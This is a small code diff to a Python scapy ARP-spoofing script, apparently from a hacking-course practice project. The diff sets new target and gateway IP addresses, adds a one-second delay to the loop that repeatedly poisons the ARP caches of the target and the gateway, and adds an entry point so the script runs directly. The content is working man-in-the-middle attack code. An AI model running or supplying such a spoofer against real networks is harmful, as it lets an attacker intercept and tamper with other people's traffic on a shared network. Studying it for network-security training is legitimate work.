@@ -26,8 +26,8 @@ def restore(destination_ip, source_ip):
     scapy.send(packet, verbose=False)
 
 
-target_ip = "172.16.13.122"  # Enter your target IP
-gateway_ip = "172.16.255.254"  # Enter your gateway's IP
+target_ip = "192.168.68.117"  # Enter your target IP
+gateway_ip = "192.168.68.1"  # Enter your gateway's IP
 
 
 def main():
@@ -37,6 +37,7 @@ def main():
             spoof(target_ip, gateway_ip)
             spoof(gateway_ip, target_ip)
             sent_packets_count = sent_packets_count + 2
+            time.sleep(1)
             #print("\r[*] Packets Sent " + str(sent_packets_count), end="")
 
     except KeyboardInterrupt:
@@ -46,3 +47,5 @@ def main():
         print("[+] Arp Spoof Stopped")
 
 
+if __name__ == '__main__':
+    main()
